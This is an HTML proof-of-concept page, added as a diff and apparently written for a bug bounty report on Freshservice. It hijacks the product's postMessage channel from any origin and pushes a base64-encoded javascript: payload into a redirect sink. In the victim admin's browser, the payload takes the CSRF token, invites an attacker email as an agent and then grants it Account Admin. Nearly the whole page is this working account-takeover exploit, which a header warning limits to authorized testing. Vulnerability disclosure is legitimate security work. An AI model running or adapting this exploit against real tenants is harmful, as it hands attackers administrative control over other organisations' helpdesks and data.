@@ -1,0 +1,103 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>C7 → ATO — postMessage hijack invites attacker admin</title>
+<style>body{font:14px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;margin:0;padding:28px;
+background:#0f1115;color:#e6e6e6}h1{font-size:18px;margin:0 0 6px}.s{color:#8b93a1;margin-bottom:20px}
+label{display:block;margin:14px 0 4px;color:#8b93a1;font-size:12px;text-transform:uppercase;letter-spacing:.05em}
+input{width:100%;max-width:680px;padding:9px 11px;border:1px solid #2a2f3a;border-radius:6px;background:#161a22;
+color:#e6e6e6;font:13px ui-monospace,Menlo,monospace}button{margin-top:20px;padding:11px 22px;border:0;border-radius:6px;
+background:#e5484d;color:#fff;font-size:14px;font-weight:600;cursor:pointer}
+#log{margin-top:20px;padding:14px;background:#161a22;border:1px solid #2a2f3a;border-radius:6px;
+font:12px ui-monospace,Menlo,monospace;white-space:pre-wrap;max-height:320px;overflow:auto}
+.w{background:#3a2a10;border:1px solid #6b4a12;color:#f5c26b;padding:12px;border-radius:6px;margin-bottom:18px}</style>
+
+<h1>C7 → Account Takeover — no agent, no ticket, one link</h1>
+<div class="s">A page on ANY origin hijacks the Freshservice MFE postMessage port and, via the
+<code>window.location = redirectUrl</code> <code>javascript:</code> sink, runs an <b>invite-attacker-admin</b>
+chain in the victim admin's browser. When they open this and click, an activation email for a new
+<b>Account Admin</b> is sent to the attacker's mailbox.</div>
+
+<div class="w"><b>Authorized testing only — this is destructive to account membership.</b>
+It creates a real Account-Admin agent for <code>ATTACKER_EMAIL</code> on the victim tenant. Fire only on a
+tenant you own. The <code>deleteUrl</code> below returns 2xx and deletes nothing (it only reaches the sink).</div>
+
+<label>Victim tenant origin</label><input id="origin" value="https://nnhhaa.freshservice.com">
+<label>Victim page (any page with the inline MFE bootstrap)</label><input id="page" value="/ws/2/admin/business_rules">
+<label>deleteUrl — harmless 2xx trigger (reaches the success callback, deletes nothing)</label>
+<input id="del" value="/api/_/tickets/delete_multiple?ids[]=999999999">
+<label>Attacker email (invited as Account Admin)</label>
+<div style="display:flex;gap:10px;align-items:center;max-width:680px">
+  <input id="attacker" value="nnhhaa+super@wearehackerone.com" style="flex:1">
+  <button id="gen" style="margin-top:0;background:#3e63dd;white-space:nowrap">Generate</button>
+</div>
+<label>redirectUrl — the ATO payload (auto-built by Generate: javascript: URI, base64 invite+grant chain)</label>
+<input id="red" value="" placeholder="click Generate to build the payload for the attacker email">
+
+<button id="go">Run ATO</button>
+<div id="log">idle.</div>
+
+<script>
+const SELS=['#fs-shared-delete-confirmation-modal-host','#fresh-lnb-root'];
+const PORTS=[]; let w=null;
+const log=m=>{const e=document.getElementById('log');
+  e.textContent+=(e.textContent==='idle.'?'':'\n')+m; e.scrollTop=e.scrollHeight;};
+
+// The ATO chain that runs in the victim admin's browser. __ATTACKER__ is replaced with the
+// entered email (as a quoted JS string) by buildRedirect(), then the whole thing is base64'd
+// into a javascript: URI so it can ride in redirectUrl.
+const PAYLOAD_SRC = `(async function(){
+  var ATTACKER=__ATTACKER__;
+  var csrf=(document.querySelector('meta[name=csrf-token]')||{}).content||'';
+  var H={'Content-Type':'application/json','X-CSRF-Token':csrf,'X-Requested-With':'XMLHttpRequest'};
+  var done=false,note='';
+  try{
+    var roles=((await (await fetch('/api/_/roles?per_page=50',{credentials:'include'})).json()).roles)||[];
+    var admin=roles.find(function(r){return r.role_type===1&&/account admin/i.test(r.name);})||roles.find(function(r){return r.role_type===1;});
+    var agentRole=roles.find(function(r){return r.role_type===2;});
+    var ws=2;try{var wl=((await (await fetch('/api/_/workspaces',{credentials:'include'})).json()).workspaces)||[];if(wl.length)ws=wl[0].id;}catch(e){}
+    await fetch('/api/_/agents/create-bulk-agents-in-workspace',{method:'POST',credentials:'include',headers:H,
+      body:JSON.stringify({workspace_id:ws,invited_agents:[{email:ATTACKER,roles:[{role_id:agentRole.id,assignment_scope:'entire_helpdesk'}]}]})});
+    var needle=ATTACKER.toLowerCase().replace(/[^a-z0-9]/g,''),uid=null;
+    for(var pg=1;pg<=4&&!uid;pg++){var j=await (await fetch('/api/_/agents?per_page=50&page='+pg,{credentials:'include'})).json();
+      var a=(j.agents||[]).find(function(x){return ((x.email||'')+(x.api_name||'')).toLowerCase().replace(/[^a-z0-9]/g,'').indexOf(needle)>-1;});
+      if(a)uid=a.user_id||a.id||a.agent_id;}
+    if(uid){var r=await fetch('/api/_/agents/'+uid+'/map_workspace_groups_and_roles',{method:'PUT',credentials:'include',headers:H,
+      body:JSON.stringify({workspace_id:ws,roles:[{role_id:admin.id,assignment_scope:'entire_helpdesk'}]})});done=r.ok;}
+    else{note='agent not found';}
+  }catch(e){note=String(e);}
+  alert(done?'Attacker email added as superadmin!!!':('ATO failed'+(note?': '+note:'')));
+})();`;
+
+function buildRedirect(){
+  const email=document.getElementById('attacker').value.trim();
+  if(!email){log('[gen] enter an attacker email first');return;}
+  const src=PAYLOAD_SRC.replace('__ATTACKER__', JSON.stringify(email));
+  const b64=btoa(unescape(encodeURIComponent(src)));   // utf-8 safe base64
+  document.getElementById('red').value="javascript:eval(atob('"+b64+"'));void 0";
+  log('[gen] redirectUrl rebuilt to invite '+email+' as Account Admin');
+}
+document.getElementById('gen').onclick=buildRedirect;
+buildRedirect();   // populate on load with the default email
+function spray(){ for(const s of SELS){ const ch=new MessageChannel();
+  ch.port1.start(); ch.port1.postMessage(payload()); PORTS.push(ch.port1);
+  try{w.postMessage({type:'fs-react-mfe-host-main-init',domElementSelectorId:s},'*',[ch.port2]);}catch(e){} } }
+function payload(){ return {action:'deleteConfirmationModalConfirm',
+  payload:{moduleName:'business_rule',
+    deleteUrl:document.getElementById('del').value,
+    redirectUrl:document.getElementById('red').value}}; }
+function refire(){ for(const p of PORTS){ try{p.postMessage(payload());}catch(e){} } }
+document.getElementById('go').onclick=()=>{
+  const o=document.getElementById('origin').value.replace(/\/+$/,'');
+  const pg=document.getElementById('page').value;
+  document.getElementById('log').textContent='idle.'; PORTS.length=0;
+  log('[1] opening victim: '+o+pg);
+  w=window.open(o+pg,'c7ato'); if(!w){log('[!] popup blocked — allow popups and retry');return;}
+  for(let d=0;d<=6000;d+=20) setTimeout(spray,d);
+  const si=setInterval(spray,150); const fi=setInterval(refire,30);
+  setTimeout(()=>{clearInterval(si);clearInterval(fi);
+    log('[2] sprayed '+PORTS.length+' handshakes');
+    log('[3] if it landed: an Account-Admin invite was sent to the attacker email.');
+    log('    Verify in the tenant Agents list + the attacker mailbox for the activation link.');
+  },16000);
+};
+</script>
